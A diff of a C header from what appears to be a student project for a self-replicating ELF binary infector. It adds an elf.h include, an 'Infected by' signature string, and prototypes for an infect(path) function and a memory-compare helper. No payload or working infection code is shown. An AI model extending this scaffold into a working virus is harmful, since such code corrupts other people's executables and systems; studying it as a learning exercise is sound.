@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/31 11:08:56 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/10/31 13:50:49 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,9 +18,13 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <stdbool.h>
+#include <elf.h>
 
 typedef	char *			str;
 typedef	unsigned char	byte;
+
+#define SIGNATURE		"Infected by adben-mc and nguiard ;)"
+#define SIGNATURE_LEN	36
 
 typedef struct dirent {
 	unsigned long	d_ino;
@@ -41,11 +45,15 @@ typedef struct dirent {
 
 #include "asm_macros.h"
 
-//	Main
+//	Utils
 size_t	ft_strlen(str buff);
+bool	ft_memcmp(const byte *a, const byte *b, size_t size);
 
 //	Infection
 bool	infect(const str path);
+
+
+
 // Debug purpose
 #ifdef DEBUG
 
